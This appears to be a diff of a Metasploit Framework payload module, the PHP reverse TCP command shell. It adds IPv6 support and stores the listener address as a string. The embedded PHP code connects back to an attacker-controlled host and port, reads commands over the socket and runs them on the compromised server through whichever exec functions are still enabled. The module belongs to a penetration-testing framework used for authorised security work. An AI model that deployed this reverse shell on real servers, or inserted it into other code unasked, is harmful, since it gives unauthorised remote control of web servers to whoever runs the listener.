@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -23,8 +19,7 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
-			'Version'       => '$Revision$',
+			'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
 			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
 			'Author'        => 'egypt',
 			'License'       => BSD_LICENSE,
@@ -52,16 +47,24 @@ module Metasploit3
 
 		if (!datastore['LHOST'] or datastore['LHOST'].empty?)
 			# datastore is empty on msfconsole startup
-			ipaddr = 0x7f000001
+			ipaddr = '127.0.0.1'
 			port = 4444
 		else
-			ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
+			ipaddr = datastore['LHOST']
 			port = datastore['LPORT']
 		end
 		exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)
 
+		uri = "tcp://#{ipaddr}"
+		socket_family = "AF_INET"
+
+		if Rex::Socket.is_ipv6?(ipaddr)
+			uri = "tcp://[#{ipaddr}]"
+			socket_family = "AF_INET6"
+		end
+
 		shell=<<-END_OF_PHP_CODE
-		$ipaddr=long2ip(#{ipaddr});
+		$ipaddr='#{ipaddr}';
 		$port=#{port};
 		#{php_preamble({:disabled_varname => "$dis"})}
 
@@ -74,7 +77,7 @@ module Metasploit3
 		}
 		$nofuncs='no exec functions';
 		if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
-			$s=@fsockopen($ipaddr,$port);
+			$s=@fsockopen("#{uri}",$port);
 			while($c=fread($s,2048)){
 				$out = '';
 				if(substr($c,0,3) == 'cd '){
@@ -92,7 +95,7 @@ module Metasploit3
 			}
 			fclose($s);
 		}else{
-			$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+			$s=@socket_create(#{socket_family},SOCK_STREAM,SOL_TCP);
 			@socket_connect($s,$ipaddr,$port);
 			@socket_write($s,"socket_create");
 			while($c=@socket_read($s,2048)){
